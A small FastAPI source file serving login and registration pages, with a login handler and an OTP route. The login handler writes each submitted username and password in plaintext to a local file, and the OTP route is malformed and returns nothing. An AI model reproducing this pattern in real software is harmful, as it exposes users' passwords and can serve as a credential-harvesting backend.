from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles

app = FastAPI()

# Static folder
app.mount("/static", StaticFiles(directory="static"), name="static")


# Templates
templates = Jinja2Templates(directory="templates")


@app.get("/", name="login")
def show_form(request: Request):
    return templates.TemplateResponse("login_page.html", {"request": request})


@app.get("/register", name="register")
def show_register_form(request: Request):
    return templates.TemplateResponse("register_page.html", {"request": request})


@app.post("/login_success", name="login_success")
def show_login_success(
    request: Request, username: str = Form(...), password: str = Form(...)
):
    with open("data.txt", "w") as f:
        f.write(f"Username: {username}\nPassword: {password}")
    return templates.TemplateResponse("login_success.html", {"request": request})


@app.post("otp_send", name="otp_send")
def otp_sender(request: Request, usergmail: str = Form(...), password: str = Form(...)):
    from otp_sender import send_otp

    send_otp(usergmail)
